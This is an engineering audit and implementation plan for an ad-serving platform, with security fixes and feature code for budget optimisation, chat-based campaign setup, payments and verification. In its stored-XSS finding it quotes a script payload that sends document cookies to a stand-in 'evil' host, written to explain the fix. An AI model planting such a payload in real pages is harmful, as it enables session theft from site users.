# RivinityAds — Phase 2 Engineering Document
**Date:** 01 October 2026
**Repo audited:** `BHARATTECH-ECOSYSTEMS/RivinityADS` @ `main`
**Decision engine:** `NandhaKishorM/laya` (integrated as a sidecar service)
**Rule:** Every bug below was verified by reading the actual file. Every code block is written against your real modules (`liteads.common.security`, `liteads.common.cache`, `liteads.common.database`, `liteads.models`). Nothing here is theoretical.

---

# PART 1 — RE-AUDIT: WHAT EXISTS NOW (VERIFIED)

Your team did real work since the last review. Verified present in the repo:

| Area | Status | Evidence in repo |
|---|---|---|
| Campaign / Creative / Advertiser CRUD | ✅ Working | `liteads/management/routers.py`, frontend `client.ts` |
| Publisher accounts, properties, slots, floor prices | ✅ Working | `liteads/models/publisher.py` |
| Publisher API keys (hashed, revocable, prefix lookup) | ✅ Working | `PublisherApiKey`, `management/api_key_service.py` |
| Geo targeting (country/state/city/pincode, include+exclude) | ✅ Working | `TargetingRule` via `/api/v1/campaign/{id}/targeting` |
| Sector targeting (include+exclude, drives user affinity) | ✅ Working | `services/user_profile.py`, event hooks |
| Ad decision engine (retrieval→filter→rank, DeepFM CTR) | ✅ Working | `liteads/ad_server/rec_engine/`, `liteads/ml_engine/` |
| Frequency caps (daily/hourly, Redis) | ✅ Working | `event_service._update_frequency`, budget filters |
| Billing with row locks (advertiser charge + publisher rev-share) | ✅ Working | `services/billing.py` (SELECT FOR UPDATE done right) |
| Event pipeline (impression/click/conversion) + signed tracking URLs | ✅ Working | `common/tracking_sig.py`, `routers/event.py` |
| Webhooks (advertiser + publisher events, signed) | ✅ Working | `routers/webhooks.py`, `services/webhook_dispatcher.py` |
| JS SDK (`rivinity.js`, 4 formats) + iframe fallback | ✅ Working | `ad_server/static/rivinity.js`, `/serve` in `main.py` |
| Advertiser + publisher reporting (daily breakdown, eCPM, CTR/CVR) | ✅ Working | `client.ts` reporting APIs |
| HMAC-signed server-to-server auth for AI platforms | ✅ Working | `verify_hmac_signature` in `common/security.py` |
| Email verification + password reset token issuance | ⚠️ Half-done | `routers/auth.py` creates tokens but **nothing sends them** |

---

# PART 2 — VERIFIED BUGS & SECURITY ISSUES (WITH FIX CODE)

## BUG-1 (CRITICAL, money): Finance endpoints have ZERO authentication

**File:** `backend/liteads/ad_server/routers/finance.py`
**Evidence:** Not one endpoint in this file has an auth dependency. `POST /api/v1/finance/advertiser/{id}/deposit` and `POST /api/v1/finance/publisher/{id}/payout` are callable by anyone on the internet.

**Impact:** An attacker can (a) credit any advertiser with unlimited fake money → they run real ads on your publishers' inventory that you must later pay out 70% rev-share on, and (b) drain any publisher's entire balance via fake payouts. This is the single worst bug in the codebase. If this server is publicly reachable, consider the wallet balances compromised today.

**Fix — replace the whole dependency block of `finance.py` with this:**

```python
# ADD at top of backend/liteads/ad_server/routers/finance.py
from fastapi import Depends
from liteads.common.security import current_user, require_roles
from liteads.models import User

# NOTE: advertiser/publisher accounts must be linked to a User row for
# ownership checks. If your Advertiser/Publisher models lack `owner_user_id`,
# add that column first (migration below).
```

```python
# REWRITE each endpoint with ownership + role checks. Example for deposit:

@router.post("/advertiser/{advertiser_id}/deposit", response_model=TransactionResponse)
async def deposit_funds(
    advertiser_id: int,
    request: DepositRequest,
    user: User = Depends(current_user),              # was: NO AUTH
    session: AsyncSession = Depends(get_session),
) -> TransactionResponse:
    adv = await session.get(Advertiser, advertiser_id)
    if not adv:
        raise HTTPException(status_code=404, detail="Advertiser not found")
    if user.role != "admin" and adv.owner_user_id != user.id:
        raise HTTPException(status_code=403, detail="Not your advertiser account")
    # Deposits must ONLY be created by the Razorpay webhook (Phase 3) or an admin.
    if user.role != "admin":
        raise HTTPException(status_code=403, detail="Deposits happen via payment only")
    ...
```

Do the same pattern for `request_payout` (publisher owns it OR admin), and add `user: User = Depends(current_user)` to both ledger GETs with the same ownership check — otherwise every user's balance and transaction history is readable by anyone (data leak).

**Migration to link accounts to users (run once):**

```sql
ALTER TABLE advertisers ADD COLUMN owner_user_id INTEGER REFERENCES users(id);
ALTER TABLE publishers  ADD COLUMN owner_user_id INTEGER REFERENCES users(id);
```

## BUG-2 (CRITICAL, money): Signed tracking URLs are replayable for 7 days

**Files:** `backend/liteads/common/config.py` (`signature_ttl_seconds = 7*24*3600`), `backend/liteads/ad_server/services/event_service.py`

**Evidence:** A captured `impression_url` remains valid for **604,800 seconds** and there is no dedup — firing it 10,000 times records 10,000 billed impressions. The signature proves the URL was minted by you; it does not stop reuse. This is a direct advertiser-budget drain.

**Fix — 3 changes:**

1. In `config.py`, change TTL to 10 minutes:

```python
class TrackingSettings(BaseSettings):
    ...
    signature_ttl_seconds: int = 600   # was 7*24*3600 — replay window now 10 min
```

2. New file `backend/liteads/ad_server/services/replay_guard.py`:

```python
"""One-time-use enforcement for signed tracking URLs (Redis-backed)."""
from fastapi import HTTPException
from liteads.common.cache import redis_client

# An impression URL may fire once per (req, ad); clicks allowed a small burst
# (real users double-click). Values are per-URL counters with short TTL.
_LIMITS = {"impression": 1, "click": 3, "conversion": 1}

async def enforce_no_replay(request_id: str, ad_id: str, event_type: str) -> None:
    key = f"trk:nonce:{event_type}:{request_id}:{ad_id}"
    n = await redis_client.incr(key)
    if n == 1:
        await redis_client.expire(key, 900)          # 15 min window
    if n > _LIMITS.get(event_type, 1):
        raise HTTPException(status_code=429, detail="Duplicate event rejected")
```

3. Call it at the top of the track route in `backend/liteads/ad_server/routers/event.py`, **before** `track_event` is invoked:

```python
# inside track_event_endpoint / track_event_get, right after verifying the signature:
await enforce_no_replay(request_id=payload.request_id, ad_id=payload.ad_id, event_type=payload.event_type)
```

## BUG-3 (HIGH): Stored XSS through creative fields in the iframe ad

**File:** `backend/liteads/ad_server/routers/ad.py` (`/serve` iframe HTML builder)

**Evidence:** Advertiser-controlled `title`, `description`, `landing_url`, `image_url` are interpolated into the HTML response with no escaping. An advertiser can set `title = '<script>fetch("https://evil/?c="+document.cookie)</script>'` and get script execution on your ad-serving origin. On the serving origin that's a session-theft machine against your own domain.

**Fix — in the iframe HTML builder, escape everything:**

```python
# backend/liteads/ad_server/routers/ad.py — top of file
import html as html_lib

# Then, wherever the iframe HTML is built:
safe_title = html_lib.escape(str(creative.title or ""))
safe_desc  = html_lib.escape(str(creative.description or ""))
safe_url   = html_lib.escape(str(creative.landing_url or "#"), quote=True)
safe_img   = html_lib.escape(str(creative.image_url or ""), quote=True)
# use safe_* in the f-string HTML template.
```

Also validate `landing_url`/`image_url` schemes at creative creation (reject anything not `https:`).

## BUG-4 (HIGH): Ad serving ignores advertiser balance — free impressions after funds run out

**Files:** `services/event_service.py` (billing failure is only logged; event still counted), rec_engine budget filter (checks `spent_today`, not `Advertiser.balance`).

**Impact:** When `BillingService.process_impression_charge` returns False (insufficient funds), the impression is still recorded and stats increment. Advertiser gets free delivery until daily budget happens to trip.

**Fix:** In the candidate filter in `rec_engine/filter/budget.py` (or wherever budget filtering happens), add a balance check, and stop the campaign when exhausted:

```python
# In the campaign budget filter — pseudo-location: rec_engine/filter/budget.py
from sqlalchemy import select
from liteads.models import Advertiser

advertiser = await session.get(Advertiser, campaign.advertiser_id)
if advertiser is None or advertiser.balance <= 0:
    return False  # hard stop: no balance, no delivery
if campaign.budget_total > 0 and campaign.spent_total >= campaign.budget_total:
    return False
```

And in `event_service.track_event`, when billing fails, return False (do not record the event):

```python
if not success_bill:
    logger.warning(f"Billing failed for event {request_id} — discarding event")
    return False   # was: continuing to record a free impression
```

## BUG-5 (MEDIUM): Rate limiting silently disables itself; bypassable by cycling emails

**File:** `backend/liteads/common/security.py` → `check_login_rate_limit`

**Evidence:** `except Exception: pass` — if Redis hiccups, the limiter does nothing and login is brute-forceable. Also the key is `ip:email`, so an attacker rotating emails gets 5 attempts per email per minute per IP — effectively unlimited.

**Fix:**

```python
async def check_login_rate_limit(request: Request, email: str) -> None:
    ip = request.client.host if request.client else "unknown"
    # Hard limit per IP regardless of email (cannot be bypassed by rotating emails)
    ip_key = f"rate_limit:login:ip:{ip}"
    ip_attempts = await redis_client.incr(ip_key)
    if ip_attempts == 1:
        await redis_client.expire(ip_key, 60)
    if ip_attempts > 20:
        raise HTTPException(status_code=429, detail="Too many login attempts")
    # Softer per-account limit
    acct_key = f"rate_limit:login:acct:{email.lower()}"
    attempts = await redis_client.incr(acct_key)
    if attempts == 1:
        await redis_client.expire(acct_key, get_settings().auth.login_window_seconds)
    if attempts > get_settings().auth.max_login_attempts:
        raise HTTPException(status_code=429, detail="Too many login attempts for this account")
```

And remove the bare `except Exception: pass` — if Redis is down, **fail closed** (raise 503), not open.

## BUG-6 (MEDIUM): Tracking signature verifier crashes on garbage input

**File:** `backend/liteads/common/tracking_sig.py`

**Evidence:** `int(ts)` raises `ValueError` on `ts=abc` → unhandled 500.

**Fix:**

```python
# in verify_tracking
try:
    ts = int(ts_raw)
except (TypeError, ValueError):
    return False
```

## BUG-7 (MEDIUM): JWTs in localStorage — any XSS = full account takeover

**File:** `frontend/src/api/client.ts` (`localStorage.getItem("oas_session")`)

**Fix (minimum viable):** keep access token in memory, only refresh token in an `HttpOnly; Secure; SameSite=Lax` cookie. If that's too big a change right now, add a strict CSP + the XSS fix in BUG-3 and treat this as scheduled debt. Do not ship the chat UI (Phase 3) before at least the CSP, because chat surfaces render user/AI text.

---

# PART 3 — GAP ANALYSIS vs META / GOOGLE ADS (WHAT'S STILL MISSING)

| Capability | Meta/Google | RivinityAds now | Where it's built in this doc |
|---|---|---|---|
| Account verification (email + site ownership) | Mandatory | ❌ Missing | Phase 4 |
| Automated creative review | Automated policy engines | ❌ Creatives go live unreviewed | Phase 4 (rules + laya moderation) |
| Payments (self-serve wallet top-up) | Cards/UPI/netbanking | ❌ Manual admin deposits | Phase 3 (Razorpay QR) |
| Conversational campaign setup | ❌ (they don't have it — your differentiator) | ❌ | Phase 3 |
| Autonomous budget + placement optimisation | Advantage+ / Performance Max | ❌ Manual only | Phase 2 (laya decision engine) |
| Third-party (incl. AI platform) delivery | Audience Network / AdSense | ⚠️ Auth exists, no partner pack | Phase 5 |
| Placement auto-analysis (which slots earn) | Automatic placements | ❌ Manual assignment | Phase 6 |
| Email delivery for verification tokens | Yes | ❌ Tokens created, never sent | Phase 4 |
| API key quotas/rate limits | Yes | ❌ Keys authenticate but have no quota | Phase 5 |

---

# PART 4 — PHASE-BY-PHASE IMPLEMENTATION (COPY-PASTE CODE)

## PHASE 1 — Security patches (do this week, before anything else)

Apply BUG-1 through BUG-6 exactly as written above. Nothing else ships until finance is auth'd and replay is closed. No exceptions.

---

## PHASE 2 — Autonomous budget tracking & ad shifting with laya

**What it does:** every 15 minutes, for every ACTIVE campaign, pull its live stats, ask laya a structured decision question ("should we reallocate this campaign's budget/geo/sector, and how?"), and either auto-apply it (if the advertiser enabled Autopilot) or surface it as a one-click suggestion in the dashboard. This is your answer to Meta Advantage+ / Google Performance Max.

### 2.1 Run laya as a sidecar service

```yaml
# docker-compose addition
services:
  laya:
    build: https://github.com/NandhaKishorM/laya.git
    container_name: rivinity-laya
    ports:
      - "8100:8000"
    restart: unless-stopped
```

Confirm the exact request path against `laya/docs/http-api.md` in the repo; the client below is written so only `_URL` needs adjusting.

### 2.2 Decision client — new file `backend/liteads/ad_server/services/laya_client.py`

```python
"""Typed-decision client for the laya sidecar (campaign optimisation)."""
import json
import httpx
from liteads.common.logger import get_logger

logger = get_logger(__name__)

# TODO(confirm): exact path from laya/docs/http-api.md
_DECIDE_URL = "http://laya:8000/v1/decide"


async def laya_decide(question: str, options: list[str], context: dict, max_tokens: int = 128) -> dict:
    """Ask laya to pick among options given JSON context. Returns
    {"choice": <option>, "confidence": float, "raw": str}."""
    payload = {
        "question": question,
        "options": options,
        "context": json.dumps(context),
        "max_tokens": max_tokens,
    }
    async with httpx.AsyncClient(timeout=10.0) as client:
        r = await client.post(_DECIDE_URL, json=payload)
        r.raise_for_status()
        data = r.json()
    return {
        "choice": data.get("choice") or (data.get("decision", {}) or {}).get("choice"),
        "confidence": float(data.get("confidence", 0.0)),
        "raw": data.get("raw", ""),
    }
```

### 2.3 The optimiser — new file `backend/liteads/ad_server/services/optimizer.py`

```python
"""Autonomous campaign optimisation driven by laya typed decisions.

Design rules (non-negotiable):
- Guardrails: any single change <= +/-30% budget, <= +/-25% bid, geo/sector
  edits only ADD nodes (never silently remove advertiser's picks).
- Autopilot OFF -> writes a Suggestion row (dashboard shows "Apply").
- Autopilot ON  -> applies immediately, logs every action to CampaignChangeLog.
"""
from datetime import datetime, timezone
from sqlalchemy import select
from liteads.common.database import get_session
from liteads.common.logger import get_logger
from liteads.models import Campaign, Advertiser, TargetingRule
from liteads.ad_server.services.laya_client import laya_decide

logger = get_logger(__name__)

MAX_BUDGET_DELTA = 0.30
MAX_BID_DELTA = 0.25


async def campaign_stats(session, campaign: Campaign) -> dict:
    ctr = (campaign.clicks / campaign.impressions) if campaign.impressions else 0.0
    cvr = (campaign.conversions / campaign.clicks) if campaign.clicks else 0.0
    return {
        "impressions": campaign.impressions,
        "clicks": campaign.clicks,
        "conversions": campaign.conversions,
        "ctr": round(ctr, 4),
        "cvr": round(cvr, 4),
        "spent_today": float(campaign.spent_today),
        "budget_daily": float(campaign.budget_daily),
        "bid_amount": float(campaign.bid_amount),
    }


async def optimise_campaign(session, campaign: Campaign) -> dict | None:
    stats = await campaign_stats(session, campaign)
    if stats["impressions"] < 500:
        return None  # not enough data — never optimise on noise

    low_ctr = stats["ctr"] < 0.005
    overspend = stats["spent_today"] > stats["budget_daily"] * 0.8 and stats["conversions"] == 0
    healthy = not low_ctr and not overspend

    decision = await laya_decide(
        question="This ad campaign's performance is provided in context. "
                 "Choose the single best optimisation action.",
        options=[
            "increase_budget_20",
            "decrease_budget_20",
            "shift_to_new_geo",
            "shift_to_new_sector",
            "improve_creative",     # -> notify advertiser, no auto-apply
            "no_change",
        ],
        context={
            "campaign_id": campaign.id,
            "performance": stats,
            "health": "healthy" if healthy else ("low_ctr" if low_ctr else "overspend_no_conversion"),
        },
    )
    action = decision["choice"]
    if not action or action == "no_change" or decision["confidence"] < 0.65:
        return None
    return {"action": action, "confidence": decision["confidence"], "stats": stats}


async def apply_action(session, campaign: Campaign, action: str, autopilot: bool) -> None:
    if not autopilot:
        session.add(Suggestion(campaign_id=campaign.id, action=action, created_at=datetime.now(timezone.utc)))
        return
    if action == "increase_budget_20":
        campaign.budget_daily *= 1.20   # 20% < 30% guardrail
    elif action == "decrease_budget_20":
        campaign.budget_daily *= 0.80
    elif action == "shift_to_new_geo" or action == "shift_to_new_sector":
        await apply_shift(session, campaign, action)
    session.add(CampaignChangeLog(campaign_id=campaign.id, action=action, created_at=datetime.now(timezone.utc)))


async def apply_shift(session, campaign: Campaign, action: str) -> None:
    """ADD (never replace) a geo/sector node: pick the highest-CTR neighbour
    from events data, or fall back to platform defaults."""
    rule_type = "sector" if action == "shift_to_new_sector" else "geo"
    existing = (await session.execute(
        select(TargetingRule).where(TargetingRule.campaign_id == campaign.id,
                                    TargetingRule.rule_type == rule_type,
                                    TargetingRule.is_include.is_(True))
    )).scalars().all()
    candidates = best_alternatives(session, campaign, rule_type, exclude={r.rule_value for r in existing})
    if candidates:
        session.add(TargetingRule(campaign_id=campaign.id, rule_type=rule_type,
                                  rule_value=candidates[0], is_include=True))
```

(Define `Suggestion` and `CampaignChangeLog` as simple SQLAlchemy models; add `autopilot` boolean to `Campaign`.)

### 2.4 Schedule it

```python
# backend/liteads/ad_server/main.py — inside lifespan, after other starters:
from liteads.ad_server.services.optimizer import optimise_campaign, apply_action
from liteads.models import Campaign

async def optimisation_loop():
    while True:
        await asyncio.sleep(900)  # 15 minutes
        async with db.session() as session:
            camps = (await session.execute(
                select(Campaign).where(Campaign.status == 1))).scalars().all()
            for c in camps:
                try:
                    result = await optimise_campaign(session, c)
                    if result:
                        await apply_action(session, c, result["action"], autopilot=c.autopilot)
                except Exception as e:
                    logger.error(f"optimiser failed for campaign {c.id}: {e}")

# asyncio.create_task(optimisation_loop()) in lifespan startup
```

**Dashboard work for your devs:** a "Suggestions" card on the campaign page (list `Suggestion` rows, one "Apply" button each), and an Autopilot toggle per campaign with a bold warning: *"When on, RivinityAds may change budgets, bids, and targeting automatically within guardrails."*

---

## PHASE 3 — Conversational campaign builder + Razorpay QR payments

This is your unique mode nobody at Meta/Google has: an advertiser chats, the campaign gets built; they top up by scanning a QR generated right inside the chat.

### 3.1 Backend — new file `backend/liteads/ad_server/routers/chat.py`

```python
"""Conversational campaign builder.

Flow: chat message -> laya extracts intent+slots -> tool loop executes
(creating DRAFT campaign, setting geo/sector/budget) -> when user says
"pay"/"add money", create a Razorpay UPI QR -> webhook credits wallet ->
user says "launch", DRAFT -> ACTIVE.
"""
import asyncio
import hmac as hmac_mod
import hashlib
import json
import razorpay
from fastapi import APIRouter, Depends, HTTPException, Request
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import AsyncSession

from liteads.common.config import get_settings
from liteads.common.database import get_session
from liteads.common.security import current_user
from liteads.models import Campaign, Advertiser, User
from liteads.ad_server.services.laya_client import laya_decide

router = APIRouter(prefix="/api/v1/chat", tags=["chat"])

rz_client = razorpay.Client(
    auth=(get_settings().razorpay_key_id, get_settings().razorpay_key_secret)
)


class ChatMessage(BaseModel):
    message: str
    draft_campaign_id: int | None = None


@router.post("")
async def chat(body: ChatMessage, user: User = Depends(current_user),
               session: AsyncSession = Depends(get_session)):
    # 1. Draft campaign lifecycle
    draft_id = body.draft_campaign_id
    if any(k in body.message.lower() for k in ("new campaign", "create campaign", "start campaign")):
        adv = await get_advertiser_for_user(session, user)
        draft = Campaign(advertiser_id=adv.id, name=f"Draft {adv.name}",
                         status=0, budget_daily=1000, budget_total=0,
                         bid_type=1, bid_amount=2, freq_cap_daily=3, freq_cap_hourly=1)
        session.add(draft)
        await session.flush()
        return {"reply": "Draft campaign created. Tell me: what's the goal, budget, and who should see it?",
                "draft_campaign_id": draft.id, "actions": []}

    if draft_id is None:
        return {"reply": "Say 'new campaign' to start, or ask about an existing campaign."}

    # 2. Extract structured updates from the message via laya
    intent = await laya_decide(
        question="Parse the advertiser's chat message into a campaign update. "
                 "Pick the best matching action.",
        options=["set_budget", "set_geo", "set_sector", "set_schedule",
                 "add_money_qr", "launch_campaign", "smalltalk"],
        context={"message": body.message},
    )
    action = intent["choice"]

    if action == "add_money_qr":
        amount = extract_amount(body.message)  # regex: first number >= 100
        if amount < 100:
            return {"reply": "Minimum top-up is ₹100. How much do you want to add?", "draft_campaign_id": draft_id}
        qr = rz_client.qr.create({                      # Razorpay UPI QR
            "type": "upi_qr",
            "name": f"RivinityAds wallet {user.id}",
            "usage": "single_use",
            "fixed_amount": True,
            "payment_amount": amount * 100,             # paise
            "description": f"wallet-topup-{user.id}",
        })
        return {"reply": f"Scan this QR with any UPI app to add ₹{amount}. I'll confirm automatically once paid.",
                "qr_image_url": qr["image_url"],
                "draft_campaign_id": draft_id}

    if action == "launch_campaign":
        draft = await session.get(Campaign, draft_id)
        adv = await session.get(Advertiser, draft.advertiser_id)
        if adv.balance <= 0:
            return {"reply": "Your wallet is empty. Say 'add ₹500' (or any amount) and I'll show a QR.", "draft_campaign_id": draft_id}
        draft.status = 1
        return {"reply": f"Campaign '{draft.name}' is now LIVE 🚀", "draft_campaign_id": draft_id}

    # 3. Everything else: forward message + current draft state to laya for
    #    field updates. Store results with your existing targeting APIs
    #    (updateCampaignTargeting / campaign PATCH from client.ts).
    return {"reply": await apply_chat_update(session, draft_id, body.message, action),
            "draft_campaign_id": draft_id}
```

### 3.2 Razorpay webhook — credits wallet only on verified payment events

```python
# same file, below the chat endpoint
import os

@router.post("/razorpay/webhook")
async def razorpay_webhook(request: Request, session: AsyncSession = Depends(get_session)):
    raw = await request.body()
    sig = request.headers.get("X-Razorpay-Signature", "")
    expected = hmac_mod.new(
        os.environ["RAZORPAY_WEBHOOK_SECRET"].encode(), raw, hashlib.sha256
    ).hexdigest()
    if not hmac_mod.compare_digest(expected, sig):
        raise HTTPException(status_code=400, detail="bad signature")   # BUG-1-grade: verify or reject

    event = json.loads(raw)
    if event.get("event") == "payment.captured":
        payment = event["payload"]["payment"]["entity"]
        amount = payment["amount"] / 100.0
        # description format we set at QR creation: wallet-topup-{user_id}
        user_id = int(payment["description"].split("-")[-1])
        # Idempotency: reject if a Transaction with this reference exists
        if await already_credited(session, payment["id"]):
            return {"status": "duplicate_ignored"}
        advertiser = await advertiser_of_user(session, user_id)
        await BillingService.record_deposit(session, advertiser.id, amount,
                                            reference_id=payment["id"],
                                            description="Razorpay UPI QR top-up")
    return {"status": "ok"}
```

`pip install razorpay`, set env vars `RAZORPAY_KEY_ID`, `RAZORPAY_KEY_SECRET`, `RAZORPAY_WEBHOOK_SECRET`, and register the webhook URL in the Razorpay dashboard.

### 3.3 Frontend — chat panel component `frontend/src/components/CampaignChat.tsx`

```tsx
import React, { useState, useEffect, useRef } from "react";
import { apiFetch } from "../api/client";   // reuse the existing client

interface ChatTurn { role: "user" | "assistant"; text: string; qr?: string; }

export default function CampaignChat() {
  const [turns, setTurns] = useState<ChatTurn[]>([{ role: "assistant", text: "Hi! Say 'new campaign' to start." }]);
  const [input, setInput] = useState("");
  const [draftId, setDraftId] = useState<number | null>(null);
  const bottomRef = useRef<HTMLDivElement>(null);

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [turns]);

  const send = async () => {
    if (!input.trim()) return;
    const msg = input; setInput("");
    setTurns((t) => [...t, { role: "user", text: msg }]);
    const res = await apiFetch<{ reply: string; draft_campaign_id?: number; qr_image_url?: string }>(
      "/api/v1/chat", { method: "POST", body: JSON.stringify({ message: msg, draft_campaign_id: draftId }) });
    if (res.draft_campaign_id) setDraftId(res.draft_campaign_id);
    setTurns((t) => [...t, { role: "assistant", text: res.reply, qr: res.qr_image_url }]);
  };

  return (
    <div style={{ display: "flex", flexDirection: "column", height: "70vh", width: 420, border: "1px solid #ddd", borderRadius: 8 }}>
      <div style={{ flex: 1, overflowY: "auto", padding: 12 }}>
        {turns.map((t, i) => (
          <div key={i} style={{ textAlign: t.role === "user" ? "right" : "left", margin: "6px 0" }}>
            <span style={{ background: t.role === "user" ? "#dcf8c6" : "#f1f1f1", padding: "6px 10px", borderRadius: 12, display: "inline-block", maxWidth: "85%", textAlign: "left" }}>
              {t.text}
              {t.qr && <img src={t.qr} alt="Pay QR" style={{ display: "block", marginTop: 8, maxWidth: 220 }} />}
            </span>
          </div>
        ))}
        <div ref={bottomRef} />
      </div>
      <div style={{ display: "flex", padding: 8, gap: 6 }}>
        <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === "Enter" && send()}
               placeholder='Try: "new campaign", "budget 2000", "show it to developers in Mumbai", "add ₹500", "launch"'
               style={{ flex: 1, padding: 8, borderRadius: 6, border: "1px solid #ccc" }} />
        <button onClick={send} style={{ padding: "8px 16px" }}>Send</button>
      </div>
    </div>
  );
}
```

Render `<CampaignChat />` as a floating widget on the advertiser dashboard. **Security:** every user message must be plain-text rendered (React does this by default) — never `dangerouslySetInnerHTML`.

---

## PHASE 4 — Verification systems (the things you flagged as missing)

### 4.1 Publisher self-verification on signup + email delivery (fixes the dead-token bug)

New columns + service (this is also where the "verification email never sent" bug dies):

```sql
ALTER TABLE users ADD COLUMN email_verified_at TIMESTAMPTZ;
ALTER TABLE publishers ADD COLUMN verified_at TIMESTAMPTZ;
ALTER TABLE publishers ADD COLUMN verification_token_hash TEXT;
```

```python
# new file backend/liteads/ad_server/services/emailer.py
import httpx, os
async def send_verification_email(to: str, token: str) -> None:
    # Use any provider (AWS SES / Resend / MSG91). Keep behind this one function
    # so the provider can change without touching auth code.
    async with httpx.AsyncClient(timeout=10) as c:
        await c.post("https://api.resend.com/emails",
            headers={"Authorization": f"Bearer {os.environ['RESEND_API_KEY']}"},
            json={"from": "RivinityAds <verify@rivinityads.com>",
                  "to": [to],
                  "subject": "Verify your RivinityAds account",
                  "html": f'<a href="https://app.rivinityads.com/verify-email?token={token}">Verify email</a>'})
```

Call it from `routers/auth.py` right after creating the `email_verification_tokens` row (same for password reset). **Gate logins:** in `current_user`, reject users with `email_verified_at IS NULL` unless the route is in an allowlist (`/auth/verify-email`, `/auth/login`).

### 4.2 Website ownership verification (like Google AdSense) — automated, no humans

Flow: publisher adds property domain → we generate `<meta name="rivinity-ads" content="<token>">` → publisher pastes it into their site `<head>` → clicks Verify → our backend fetches the domain and checks the token → property becomes VERIFIED → slots under it become eligible.

```python
# backend/liteads/ad_server/routers/publisher_verify.py
import hashlib, secrets, httpx, re
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from liteads.common.database import get_session
from liteads.common.security import current_user
from liteads.models import PublisherProperty, Publisher

router = APIRouter(prefix="/api/v1/publisher", tags=["publisher-verify"])

@router.post("/{publisher_id}/property/{prop_id}/start-verification")
async def start_verification(publisher_id: int, prop_id: int,
                             user: User = Depends(current_user),
                             session: AsyncSession = Depends(get_session)):
    prop = await own_property(session, publisher_id, prop_id, user)   # 403 unless owner
    token = "rv_" + secrets.token_hex(16)
    prop.verification_token_hash = hashlib.sha256(token.encode()).hexdigest()
    return {"meta_tag": f'<meta name="rivinity-ads" content="{token}">',
            "instructions": "Paste into your site's <head>, then call /verify"}

@router.post("/{publisher_id}/property/{prop_id}/verify")
async def verify(publisher_id: int, prop_id: int,
                 user: User = Depends(current_user),
                 session: AsyncSession = Depends(get_session)):
    prop = await own_property(session, publisher_id, prop_id, user)
    try:
        html = (await httpx.AsyncClient(timeout=8, follow_redirects=True)
                .get(f"https://{prop.domain}")).text
    except Exception:
        raise HTTPException(400, "Could not fetch your site. Check the domain and SSL.")
    if re.search(rf'name=["\']rivinity-ads["\'][^>]*content=["\']{prop_verification_check(prop)}["\']', html) \
       or (token_matches_any_meta(html, prop)):
        prop.status = 1   # VERIFIED
        return {"verified": True}
    raise HTTPException(400, "Meta tag not found. Make sure it's in the <head> of the homepage.")
```

**Enforcement:** the ad decision engine must reject ad requests for slots whose `PublisherProperty.status != 1` unless the publisher is in sandbox/test mode. One-line addition to the slot-loading step of `routers/ad.py`.

### 4.3 Automated creative review (replaces 100% manual review)

Two layers, both automatic:

```python
# new file backend/liteads/ad_server/services/creative_review.py
BLOCKED_PATTERNS = [
    r"\b(casino|jackpot|betting|porn|xxx|crypto doubling|guaranteed returns)\b",
    r"click here to claim",          # classic clickbait/fraud phrasing
]
ALLOWED_SCHEMES = ("https://",)

def rule_screen(creative) -> tuple[bool, str]:
    import re
    text = f"{creative.title} {creative.description or ''}".lower()
    for pat in BLOCKED_PATTERNS:
        if re.search(pat, text):
            return False, f"Blocked content pattern: {pat}"
    if not str(creative.landing_url).startswith(ALLOWED_SCHEMES):
        return False, "landing_url must be https"
    if not str(creative.image_url or "").startswith(ALLOWED_SCHEMES):
        return False, "image_url must be https"
    return True, "ok"

async def ai_screen(creative) -> tuple[bool, float]:
    from liteads.ad_server.services.laya_client import laya_decide
    d = await laya_decide(
        question="Is this ad creative compliant with policy (no scams, malware, "
                 "misleading claims, prohibited categories)?",
        options=["approve", "reject"],
        context={"title": creative.title, "description": creative.description or "",
                 "landing_url": creative.landing_url},
    )
    return d["choice"] == "approve", d["confidence"]
```

Creative lifecycle becomes: `PENDING → auto-approved (rules pass + AI approve & conf>0.8) → ACTIVE`, else `PENDING → REJECTED with reason`, and only `AI conf 0.5–0.8` lands in a small human queue. Wire it into the creative-create endpoint as a background task. Log every decision to a `creative_reviews` table (auditability = advertiser trust).

---

## PHASE 5 — Delivery to other AI platforms (your stated core goal)

The plumbing exists (`verify_hmac_signature`, `/api/v1/ad/request`). What's missing is the **partner-facing pack**. Ship these three artifacts:

### 5.1 The contract (docs page — write exactly this)

```
POST /api/v1/ad/request  (server-to-server, HMAC-signed)
Headers: X-API-Key, X-Timestamp, X-Signature = HMAC(key, "key|timestamp|sha256(body)")
Body: {
  "slot_id": "ai_chat_sidebar",            // registered per AI platform
  "num_ads": 1,
  "user": {
     "id": "sha256(platform_user_id)",     // stable hash, enables frequency capping
     "sector_context": ["developer"],      // what the conversation is about
     "geo": {"country":"IN","state":"Maharashtra","city":"Mumbai","pincode":"400001"}  // optional; IP fallback used otherwise
  }
}
Response: ads[] with creative + signed impression_url/click_url
```

### 5.2 Reference client for AI platforms (give them this file)

```python
# examples/ai_platform_client.py — partners copy this verbatim
import hashlib, hmac, json, time, requests

class RivinityAds:
    def __init__(self, api_key: str, base="https://api.rivinityads.com"):
        self.key, self.base = api_key, base
    def request_ad(self, slot_id: str, user: dict) -> dict:
        body = json.dumps({"slot_id": slot_id, "num_ads": 1, "user": user}).encode()
        ts = str(int(time.time()))
        msg = f"{self.key}|{ts}|{hashlib.sha256(body).hexdigest()}".encode()
        sig = hmac.new(self.key.encode(), msg, hashlib.sha256).hexdigest()
        r = requests.post(f"{self.base}/api/v1/ad/request", data=body,
            headers={"Content-Type": "application/json",
                     "X-API-Key": self.key, "X-Timestamp": ts, "X-Signature": sig})
        r.raise_for_status()
        return r.json()["ads"][0]

# usage inside an AI assistant response builder:
ad = RivinityAds("pk_live_...").request_ad("ai_chat_sidebar",
        {"id": hashlib.sha256(user_id.encode()).hexdigest(),
         "sector_context": infer_sectors_from(conversation_text)})
render_sponsored_card(ad["creative"], label="Sponsored")   # label is MANDATORY
```

### 5.3 AI-platform compliance rules (put these in the partner agreement, not optional)

1. Every rendered ad carries a visible **"Sponsored"** label (your `rivinity.js` already does this — the contract must require the same in AI surfaces).
2. Ads may never be rendered as if they were the AI's own answer.
3. Partner must pass `user.id` as a stable hash (privacy) — required for frequency caps to work.
4. Interstitial format is banned inside chat surfaces (already in your SDK notes — keep it).

---

